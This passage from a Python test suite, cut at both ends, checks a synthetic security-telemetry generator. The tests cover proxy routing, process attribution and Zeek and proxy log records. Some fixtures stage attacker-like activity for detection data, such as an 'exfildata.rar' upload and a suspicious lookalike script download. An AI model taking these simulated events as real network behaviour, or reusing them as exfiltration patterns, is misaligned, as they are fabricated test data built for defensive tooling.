            and call.args[0].network.dst_ip == "10.0.3.10"
            and call.args[0].network.dst_port == 8080
        )

        assert client_event.process is not None
        assert client_event.process.image == "/usr/bin/curl"
        assert client_event.process.username == "root"
        assert client_event.network.initiating_pid != bash_pid

    def test_linux_proxy_replaces_service_daemon_for_tool_user_agent(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        linux_system = System(
            hostname="WEB-EXT-01",
            ip="10.0.1.10",
            os="Ubuntu 24.04",
            type="server",
        )
        generator._ip_to_system[linux_system.ip] = linux_system
        generator._proxy_routes[linux_system.ip] = [generator._ip_to_system["10.0.3.10"]]
        generator.state_manager.set_current_time(datetime(2024, 1, 15, 9, 55, 0, tzinfo=UTC))
        apache_pid = generator.state_manager.create_process(
            system=linux_system.hostname,
            parent_pid=0,
            image="/usr/sbin/apache2",
            command_line="/usr/sbin/apache2 -DFOREGROUND",
            username="www-data",
            integrity_level="Medium",
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip=linux_system.ip,
                method="CONNECT",
                url="api.github.com:443",
                host="api.github.com",
                status_code=200,
                sc_bytes=220,
                cs_bytes=340,
                time_taken=900,
                user_agent="python-requests/2.31.0",
                content_type="",
                cache_result="MISS",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip=linux_system.ip,
            dst_ip="140.82.112.6",
            time=datetime(2024, 1, 15, 10, 0, 1, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            pid=apache_pid,
            source_system=linux_system,
            hostname="api.github.com",
            conn_state="SF",
            process_image="/usr/sbin/apache2",
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == linux_system.ip
            and call.args[0].network.dst_ip == "10.0.3.10"
            and call.args[0].network.dst_port == 8080
        )

        assert client_event.process is not None
        assert client_event.process.image == "/usr/bin/python3"
        assert client_event.process.username == "root"
        assert client_event.network.initiating_pid != apache_pid

    def test_explicit_proxy_tunnel_reuse_is_user_agent_scoped(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        workstation = generator._ip_to_system["10.0.1.10"]
        generator._build_proxy_context = Mock(
            side_effect=[
                ProxyContext(
                    client_ip=workstation.ip,
                    method="CONNECT",
                    url="example.com:443",
                    host="example.com",
                    status_code=200,
                    sc_bytes=220,
                    cs_bytes=340,
                    time_taken=900,
                    user_agent=(
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) "
                        "Gecko/20100101 Firefox/121.0"
                    ),
                    content_type="",
                    cache_result="MISS",
                    referrer="-",
                    proxy_fqdn="PROXY-01.example.org",
                ),
                ProxyContext(
                    client_ip=workstation.ip,
                    method="CONNECT",
                    url="example.com:443",
                    host="example.com",
                    status_code=200,
                    sc_bytes=220,
                    cs_bytes=340,
                    time_taken=900,
                    user_agent=(
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                        "(KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
                    ),
                    content_type="",
                    cache_result="MISS",
                    referrer="-",
                    proxy_fqdn="PROXY-01.example.org",
                ),
            ]
        )

        for second in (0, 10):
            generator.generate_connection(
                src_ip=workstation.ip,
                dst_ip="93.184.216.34",
                time=datetime(2024, 1, 15, 10, 0, second, tzinfo=UTC),
                dst_port=443,
                proto="tcp",
                service="ssl",
                duration=1.0,
                orig_bytes=500,
                resp_bytes=5000,
                source_system=workstation,
                hostname="example.com",
                conn_state="SF",
            )

        client_events = [
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == workstation.ip
            and call.args[0].network.dst_ip == "10.0.3.10"
            and call.args[0].network.dst_port == 8080
        ]

        assert len(client_events) == 2
        assert client_events[0].network.zeek_uid != client_events[1].network.zeek_uid

    def test_direct_proxy_listener_flow_replaces_linux_shell_with_service_owner(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        linux_system = System(
            hostname="DB-PROD-01",
            ip="10.0.1.10",
            os="Ubuntu 24.04",
            type="server",
        )
        proxy = generator._ip_to_system["10.0.3.10"]
        generator._ip_to_system[linux_system.ip] = linux_system
        generator.state_manager.set_current_time(datetime(2024, 1, 15, 9, 55, 0, tzinfo=UTC))
        systemd_pid = generator.state_manager.create_process(
            system=linux_system.hostname,
            parent_pid=0,
            image="/usr/lib/systemd/systemd",
            command_line="/usr/lib/systemd/systemd",
            username="root",
            integrity_level="System",
        )
        bash_pid = generator.state_manager.create_process(
            system=linux_system.hostname,
            parent_pid=systemd_pid,
            image="/bin/bash",
            command_line="-bash",
            username="root",
            integrity_level="Medium",
        )

        generator.generate_connection(
            src_ip=linux_system.ip,
            dst_ip=proxy.ip,
            time=datetime(2024, 1, 15, 10, 0, 1, tzinfo=UTC),
            dst_port=8080,
            proto="tcp",
            service="http",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            pid=bash_pid,
            source_system=linux_system,
            hostname=generator._proxy_fqdn(proxy),
            conn_state="SF",
            process_image="/bin/bash",
            http=HttpContext(
                method="CONNECT",
                host="example.com",
                uri="example.com:443",
                version="1.1",
                user_agent="Wget/1.21.3",
                status_code=200,
                status_msg="Connection Established",
            ),
            proxy_bypass=True,
            preserve_http_outcome=True,
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == linux_system.ip
            and call.args[0].network.dst_ip == proxy.ip
            and call.args[0].network.dst_port == 8080
        )

        assert client_event.process is not None
        assert client_event.process.image == "/usr/bin/wget"
        assert client_event.process.username == "root"
        assert client_event.network.initiating_pid != bash_pid

    def test_ownerless_linux_server_proxy_request_does_not_fabricate_cli_process(self):
        """Role traffic without a caller must stay unattributed through explicit proxying."""
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        linux_system = System(
            hostname="DB-PROD-01",
            ip="10.0.1.10",
            os="Ubuntu 24.04",
            type="server",
            roles=["database"],
        )
        generator._ip_to_system[linux_system.ip] = linux_system
        generator._proxy_routes[linux_system.ip] = [generator._ip_to_system["10.0.3.10"]]
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip=linux_system.ip,
                method="CONNECT",
                url="packages.microsoft.com:443",
                host="packages.microsoft.com",
                status_code=200,
                sc_bytes=220,
                cs_bytes=340,
                time_taken=900,
                user_agent="Wget/1.21.4",
                content_type="",
                cache_result="MISS",
                referrer="-",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip=linux_system.ip,
            dst_ip="13.107.246.52",
            time=datetime(2024, 1, 15, 10, 0, 1, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=linux_system,
            hostname="packages.microsoft.com",
            conn_state="SF",
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == linux_system.ip
            and call.args[0].network.dst_ip == "10.0.3.10"
            and call.args[0].network.dst_port == 8080
        )
        assert client_event.process is None
        assert client_event.network.initiating_pid == -1
        assert all(
            proc.image not in {"/usr/bin/wget", "/usr/bin/curl"}
            for proc in generator.state_manager.get_processes_on_system(linux_system.hostname)
        )

    def test_direct_proxy_listener_flow_replaces_mismatched_linux_browser(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        user, linux_system, shell_pid = _seed_linux_proxy_client_user_session(generator)
        proxy = generator._ip_to_system["10.0.3.10"]
        user_session = generator.state_manager.get_sessions_for_user(user.username)[0]
        firefox_pid = generator.state_manager.create_process(
            system=linux_system.hostname,
            parent_pid=shell_pid,
            image="/usr/bin/firefox",
            command_line="firefox -P default",
            username=user.username,
            integrity_level="Medium",
            logon_id=user_session.logon_id,
        )

        generator.generate_connection(
            src_ip=linux_system.ip,
            dst_ip=proxy.ip,
            time=datetime(2024, 1, 15, 10, 0, 1, tzinfo=UTC),
            dst_port=8080,
            proto="tcp",
            service="http",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            pid=firefox_pid,
            source_system=linux_system,
            hostname=generator._proxy_fqdn(proxy),
            conn_state="SF",
            process_image="/usr/bin/firefox",
            http=HttpContext(
                method="CONNECT",
                host="example.com",
                uri="example.com:443",
                version="1.1",
                user_agent=(
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                ),
                status_code=200,
                status_msg="Connection Established",
            ),
            proxy_bypass=True,
            preserve_http_outcome=True,
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == linux_system.ip
            and call.args[0].network.dst_ip == proxy.ip
            and call.args[0].network.dst_port == 8080
        )

        assert client_event.process is not None
        assert client_event.process.pid != firefox_pid
        assert client_event.process.image == "/usr/bin/google-chrome"

    def test_direct_proxy_listener_flow_replaces_unrelated_linux_kubectl_owner(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        user, linux_system, shell_pid = _seed_linux_proxy_client_user_session(generator)
        proxy = generator._ip_to_system["10.0.3.10"]
        user_session = generator.state_manager.get_sessions_for_user(user.username)[0]
        kubectl_pid = generator.state_manager.create_process(
            system=linux_system.hostname,
            parent_pid=shell_pid,
            image="/usr/bin/kubectl",
            command_line="kubectl logs worker-3b4c2 --tail=100",
            username=user.username,
            integrity_level="Medium",
            logon_id=user_session.logon_id,
        )

        generator.generate_connection(
            src_ip=linux_system.ip,
            dst_ip=proxy.ip,
            time=datetime(2024, 1, 15, 10, 0, 1, tzinfo=UTC),
            dst_port=8080,
            proto="tcp",
            service="http",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            pid=kubectl_pid,
            source_system=linux_system,
            hostname=generator._proxy_fqdn(proxy),
            conn_state="SF",
            process_image="/usr/bin/kubectl",
            http=HttpContext(
                method="CONNECT",
                host="example.com",
                uri="example.com:443",
                version="1.1",
                user_agent=(
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                ),
                status_code=200,
                status_msg="Connection Established",
            ),
            proxy_bypass=True,
            preserve_http_outcome=True,
        )

        client_event = next(
            call.args[0]
            for call in emitters["zeek_conn"].emit.call_args_list
            if call.args[0].network.src_ip == linux_system.ip
            and call.args[0].network.dst_ip == proxy.ip
            and call.args[0].network.dst_port == 8080
        )

        assert client_event.process is not None
        assert client_event.process.pid != kubectl_pid
        assert client_event.process.image == "/usr/bin/google-chrome"

    def test_one_shot_proxy_client_process_starts_near_request_time(self):
        generator, _emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        _seed_proxy_client_user_session(generator)
        workstation = generator._ip_to_system["10.0.1.10"]
        proxy = generator._ip_to_system["10.0.3.10"]
        generator._explicit_proxy_client_process_hint = Mock(
            return_value=(
                r"C:\Windows\System32\curl.exe",
                'curl.exe --proxy http://PROXY-01.example.org:8080 "https://www.bing.com/"',
            )
        )
        request_time = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)

        pid, image = generator._ensure_explicit_proxy_client_process(
            source_system=workstation,
            time=request_time,
            proxy_context=ProxyContext(
                client_ip=workstation.ip,
                method="CONNECT",
                url="www.bing.com:443",
                host="www.bing.com",
                status_code=200,
                user_agent="curl/8.4.0",
                proxy_fqdn="PROXY-01.example.org",
            ),
            proxy_sys=proxy,
            dst_port=443,
        )

        proc = generator.state_manager.get_process(workstation.hostname, pid)
        assert image == r"C:\Windows\System32\curl.exe"
        assert proc is not None
        lead_seconds = (request_time - proc.start_time).total_seconds()
        assert 0 < lead_seconds <= 8.0

    def test_server_like_proxy_client_hint_suppresses_workstation_web_tools(self):
        generator, _emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        proxy = generator._ip_to_system["10.0.3.10"]
        server = System(
            hostname="FILE-SRV-01",
            ip="10.0.2.20",
            os="Windows Server 2022",
            type="server",
            roles=["file_server"],
        )
        dc = System(
            hostname="DC-01",
            ip="10.0.2.10",
            os="Windows Server 2022",
            type="domain_controller",
            roles=["domain_controller", "dns_server"],
        )

        for source_system in (server, dc):
            for user_agent in (
                "curl/8.4.0",
                "Wget/1.21.4",
                "python-requests/2.31.0",
                "Mozilla/5.0 Chrome/123.0.0.0",
            ):
                hint = generator._explicit_proxy_client_process_hint(
                    user_agent=user_agent,
                    hostname="downloads.cloud.com",
                    dst_port=443,
                    proxy_sys=proxy,
                    source_system=source_system,
                )

                assert hint is None

    def test_linux_server_proxy_client_hint_preserves_cli_client_family_and_target(self):
        generator, _emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        proxy = generator._ip_to_system["10.0.3.10"]
        server = System(
            hostname="MAIL-CLIN-01",
            ip="10.0.2.26",
            os="Ubuntu 22.04",
            type="server",
            roles=["mail_server"],
        )

        expected_images = {
            "curl/8.4.0": "/usr/bin/curl",
            "Wget/1.21.4": "/usr/bin/wget",
            "python-requests/2.31.0": "/usr/bin/python3",
        }
        for user_agent, expected_image in expected_images.items():
            hint = generator._explicit_proxy_client_process_hint(
                user_agent=user_agent,
                hostname="downloads.cloud.com",
                dst_port=443,
                proxy_sys=proxy,
                source_system=server,
            )

            assert hint is not None
            image, command_line = hint
            assert image == expected_image
            assert "downloads.cloud.com" in command_line
            system_owner = generator._linux_proxy_helper_system_owner_spec(
                source_system=server,
                image=image,
                command_line=command_line,
            )
            assert system_owner is not None
            assert system_owner[1:] == (image, command_line, "root")

    def test_service_connection_owner_uses_http_host_when_hostname_is_absent(self):
        generator, _emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        server = System(
            hostname="DB-PROD-01",
            ip="10.0.4.10",
            os="Ubuntu 22.04",
            type="server",
            roles=["database"],
        )

        spec = generator._service_connection_owner_spec(
            source_system=server,
            service="http",
            dst_port=8080,
            os_category="linux",
            hostname=None,
            http=HttpContext(
                method="CONNECT",
                host="packages.microsoft.com",
                uri="packages.microsoft.com:443",
                user_agent="Wget/1.21.4",
            ),
        )

        assert spec is not None
        assert spec[1] == "/usr/bin/wget"
        assert "packages.microsoft.com" in spec[2]

    def test_server_like_proxy_client_hint_keeps_service_style_owners(self):
        generator, _emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        proxy = generator._ip_to_system["10.0.3.10"]
        server = System(
            hostname="APP-01",
            ip="10.0.2.30",
            os="Windows Server 2022",
            type="server",
            roles=["app_server"],
        )

        hint = generator._explicit_proxy_client_process_hint(
            user_agent="Go-http-client/1.1",
            hostname="status.example.com",
            dst_port=443,
            proxy_sys=proxy,
            source_system=server,
        )

        assert hint is not None
        image, command_line = hint
        assert image.endswith("service-healthcheck.exe")
        assert command_line.endswith("--service")
        assert "status.example.com" not in command_line

    def test_windows_server_proxy_helper_uses_system_owner_despite_user_session(self):
        generator, _emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        proxy = generator._ip_to_system["10.0.3.10"]
        domain_controller = System(
            hostname="DC-01",
            ip="10.0.2.10",
            os="Windows Server 2022",
            type="domain_controller",
            roles=["domain_controller", "dns_server"],
        )
        user = User(
            username="aisha.johnson",
            full_name="Aisha Johnson",
            email="aisha.johnson@example.org",
        )
        generator._users_by_username = {user.username: user}
        start_time = datetime(2024, 1, 15, 9, 45, 0, tzinfo=UTC)
        generator.state_manager.set_current_time(start_time)
        services_pid = generator.state_manager.create_process(
            system=domain_controller.hostname,
            parent_pid=4,
            image=r"C:\Windows\System32\services.exe",
            command_line="services.exe",
            username="SYSTEM",
            integrity_level="System",
            logon_id="0x3e7",
        )
        logon_id = generator.state_manager.create_session(
            username=user.username,
            system=domain_controller.hostname,
            logon_type=10,
            source_ip="10.0.1.35",
        )
        explorer_pid = generator.state_manager.create_process(
            system=domain_controller.hostname,
            parent_pid=services_pid,
            image=r"C:\Windows\explorer.exe",
            command_line="explorer.exe",
            username=user.username,
            integrity_level="Medium",
            logon_id=logon_id,
        )
        session = generator.state_manager.get_session(logon_id)
        assert session is not None
        session.explorer_pid = explorer_pid
        generator._system_pids = {domain_controller.hostname: {"services": services_pid}}
        request_time = datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC)

        pid, image = generator._ensure_explicit_proxy_client_process(
            source_system=domain_controller,
            time=request_time,
            proxy_context=ProxyContext(
                client_ip=domain_controller.ip,
                method="CONNECT",
                url="status.example.com:443",
                host="status.example.com",
                status_code=200,
                user_agent="Go-http-client/1.1",
                proxy_fqdn="PROXY-01.example.org",
            ),
            proxy_sys=proxy,
            dst_port=443,
        )

        proc = generator.state_manager.get_process(domain_controller.hostname, pid)
        assert image == r"C:\Program Files\Meridian\ServiceHealth\service-healthcheck.exe"
        assert proc is not None
        assert proc.username == "SYSTEM"
        assert proc.logon_id == "0x3e7"
        assert proc.parent_pid == services_pid
        assert proc.parent_pid != explorer_pid
        assert proc.command_line.endswith("--service")

    def test_one_shot_proxy_client_process_terminates_after_request(self):
        generator, _emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )
        _seed_proxy_client_user_session(generator)
        workstation = generator._ip_to_system["10.0.1.10"]
        generator._explicit_proxy_client_process_hint = Mock(
            return_value=(
                r"C:\Windows\System32\curl.exe",
                'curl.exe --proxy http://PROXY-01.example.org:8080 "https://www.bing.com/"',
            )
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip=workstation.ip,
                method="CONNECT",
                url="www.bing.com:443",
                host="www.bing.com",
                status_code=200,
                user_agent="curl/8.4.0",
                proxy_fqdn="PROXY-01.example.org",
                cache_result="MISS",
            )
        )

        generator.generate_connection(
            src_ip=workstation.ip,
            dst_ip="204.79.197.200",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=workstation,
            hostname="www.bing.com",
            conn_state="SF",
        )

        active_images = [
            proc.image
            for proc in generator.state_manager.get_processes_on_system(workstation.hostname)
        ]
        assert r"C:\Windows\System32\curl.exe" not in active_images

    def test_documentation_ip_with_external_hostname_routes_through_proxy(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="203.0.113.45",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=80,
            proto="tcp",
            service="http",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=3000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="dynsync-update.net",
            http=HttpContext(
                method="GET",
                host="dynsync-update.net",
                uri="/jquery-3.3.1.min.js",
                version="1.1",
                user_agent="Mozilla/5.0",
                status_code=200,
                status_msg="OK",
            ),
            conn_state="SF",
        )

        pairs = _conn_pairs(emitters)
        assert ("10.0.1.10", "10.0.3.10", 8080) in pairs
        origin_ip = resolve_domain_ip("dynsync-update.net", src_host="PROXY-01")
        assert ("10.0.3.10", origin_ip, 80) in pairs
        assert ("10.0.1.10", "203.0.113.45", 80) not in pairs
        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert proxy_event.protocol.proxy.host == "dynsync-update.net"
        assert proxy_event.protocol.proxy.method == "GET"

    def test_raw_ip_with_suppressed_hostname_preserves_proxy_egress_ioc(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        raw_ip = "45.33.32.30"
        hashed_ip = resolve_domain_ip(raw_ip, src_host="PROXY-01")

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip=raw_ip,
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="ssl",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="",
            conn_state="SF",
        )

        pairs = _conn_pairs(emitters)
        assert ("10.0.1.10", "10.0.3.10", 8080) in pairs
        assert ("10.0.3.10", raw_ip, 443) in pairs
        assert ("10.0.3.10", hashed_ip, 443) not in pairs

        dns_events = [call.args[0] for call in emitters["zeek_dns"].emit.call_args_list]
        raw_ip_address_queries = [
            event
            for event in dns_events
            if event.dns.query == raw_ip and event.dns.qtype in {1, 28}
        ]
        assert not raw_ip_address_queries
        assert all(hashed_ip not in event.dns.answers for event in dns_events)

        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert proxy_event.protocol.proxy.host == raw_ip

    def test_auto_generated_proxy_get_has_no_zeek_request_body(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=80,
            proto="tcp",
            service="http",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
        )

        http_event = emitters["zeek_http"].emit.call_args.args[0]
        assert http_event.protocol.http.method == "GET"
        assert http_event.protocol.http.request_body_len == 0
        assert http_event.network.orig_bytes > 0

    def test_plaintext_proxy_upload_has_correlated_files_on_both_legs(self):
        """A visible upload is analyzed independently on client and proxy egress sensors."""

        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        entity = HttpRequestEntityContext(
            size=4096,
            mime_type="application/vnd.rar",
            content_identity="proxy-upload:/tmp/exfildata.rar:4096",
            local_source_path="/tmp/exfildata.rar",
            local_source_filename="exfildata.rar",
        )
        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=80,
            service="http",
            duration=1.0,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="some.site",
            conn_state="SF",
            http=HttpContext(
                method="POST",
                host="some.site",
                uri="/uploads/accept-upload",
                request_body_len=4096,
                request_content_type=entity.mime_type,
                request_entity=entity,
                response_body_len=512,
                resp_mime_types=("application/octet-stream",),
            ),
        )

        http_events = [call.args[0] for call in emitters["zeek_http"].emit.call_args_list]
        upload_transfers = [
            next(ft for ft in event.protocol.file_transfers if ft.is_orig) for event in http_events
        ]
        assert len(http_events) == 2
        assert {event.network.src_ip for event in http_events} == {"10.0.1.10", "10.0.3.10"}
        assert len({transfer.fuid for transfer in upload_transfers}) == 2
        assert {transfer.total_bytes for transfer in upload_transfers} == {4096}
        assert {transfer.sha1 for transfer in upload_transfers} == {upload_transfers[0].sha1}

        response_transfers = [
            next(ft for ft in event.protocol.file_transfers if not ft.is_orig)
            for event in http_events
        ]
        assert len({transfer.fuid for transfer in response_transfers}) == 2
        assert {transfer.total_bytes for transfer in response_transfers} == {512}
        assert {transfer.mime_type for transfer in response_transfers} == {
            "application/octet-stream"
        }
        assert {transfer.sha1 for transfer in response_transfers} == {response_transfers[0].sha1}
        assert response_transfers[0].sha1

    def test_plaintext_proxy_miss_correlates_every_multipart_leaf_on_both_legs(self):
        """MISS forwarding preserves part identity while allocating leg-local FUIDs."""

        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        request_multipart = build_http_multipart_context(
            HttpMultipartEntitySpec.model_validate(
                {
                    "media_type": "multipart/form-data",
                    "boundary": "request-parts",
                    "parts": [
                        {"name": "metadata", "value": "case-123"},
                        {
                            "name": "archive",
                            "body_len": 4096,
                            "filename": "evidence.rar",
                            "detected_mime_type": "application/vnd.rar",
                        },
                    ],
                }
            ),
            stable_key="proxy-request",
        )
        response_multipart = build_http_multipart_context(
            HttpMultipartEntitySpec.model_validate(
                {
                    "media_type": "multipart/mixed",
                    "boundary": "response-parts",
                    "parts": [
                        {"body_len": 7, "detected_mime_type": "text/plain"},
                        {"body_len": 11, "detected_mime_type": "application/json"},
                    ],
                }
            ),
            stable_key="proxy-response",
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=80,
            service="http",
            duration=1.0,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="some.site",
            conn_state="SF",
            http=HttpContext(
                method="POST",
                host="some.site",
                uri="/multipart",
                request_body_len=request_multipart.body_len,
                request_multipart=request_multipart,
                response_body_len=response_multipart.body_len,
                response_multipart=response_multipart,
            ),
        )

        http_events = [call.args[0] for call in emitters["zeek_http"].emit.call_args_list]
        assert len(http_events) == 2
        for is_orig in (True, False):
            per_leg = [
                [
                    transfer
                    for transfer in event.protocol.file_transfers
                    if transfer.is_orig is is_orig
                ]
                for event in http_events
            ]
            assert [len(transfers) for transfers in per_leg] == [2, 2]
            assert {
                tuple(transfer.seen_bytes for transfer in transfers) for transfers in per_leg
            } == ({(8, 4096)} if is_orig else {(7, 11)})
            assert (
                len({tuple(transfer.sha1 for transfer in transfers) for transfers in per_leg}) == 1
            )
            assert len({transfer.fuid for transfers in per_leg for transfer in transfers}) == 4

    def test_plaintext_proxy_hit_creates_client_leg_response_file_only(self):
        """A cached body is visible on the proxy-to-client leg without origin evidence."""

        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="both-sides",
                    monitoring_segments=["workstations", "dmz"],
                    direction="bidirectional",
                    log_formats=["zeek"],
                )
            ]
        )
        generator._build_proxy_context = Mock(
            return_value=ProxyContext(
                client_ip="10.0.1.10",
                method="GET",
                url="http://example.com/cache/object.bin",
                host="example.com",
                status_code=200,
                sc_bytes=178,
                cs_bytes=320,
                response_body_bytes=77,
                user_agent="agent/1.0",
                content_type="application/octet-stream",
                cache_result="HIT",
                proxy_fqdn="PROXY-01.example.org",
            )
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=80,
            service="http",
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
            http=HttpContext(
                method="GET",
                host="example.com",
                uri="/cache/object.bin",
                response_body_len=77,
                status_code=200,
                resp_mime_types=("application/octet-stream",),
            ),
        )

        http_events = [call.args[0] for call in emitters["zeek_http"].emit.call_args_list]
        assert len(http_events) == 1
        client_event = http_events[0]
        assert client_event.network.src_ip == "10.0.1.10"
        response = next(ft for ft in client_event.protocol.file_transfers if not ft.is_orig)
        assert response.total_bytes == 77
        assert response.mime_type == "application/octet-stream"

    def test_https_service_alias_uses_explicit_proxy(self):
        generator, emitters = _generator(
            [
                NetworkSensor(
                    type="network",
                    name="client-tap",
                    monitoring_segments=["workstations"],
                    direction="outbound",
                    log_formats=["zeek"],
                )
            ]
        )

        generator.generate_connection(
            src_ip="10.0.1.10",
            dst_ip="93.184.216.34",
            time=datetime(2024, 1, 15, 10, 0, 0, tzinfo=UTC),
            dst_port=443,
            proto="tcp",
            service="https",
            duration=1.0,
            orig_bytes=500,
            resp_bytes=5000,
            source_system=generator._ip_to_system["10.0.1.10"],
            hostname="example.com",
            conn_state="SF",
        )

        pairs = _conn_pairs(emitters)
        assert ("10.0.1.10", "10.0.3.10", 8080) in pairs
        assert ("10.0.1.10", "93.184.216.34", 443) not in pairs
        proxy_event = emitters["proxy_access"].emit.call_args.args[0]
        assert proxy_event.protocol.proxy.method == "CONNECT"
        assert proxy_event.protocol.proxy.host == "example.com"

    def test_plaintext_public_domain_redirects_instead_of_success(self):
        generator, emitters = _generator(
            [
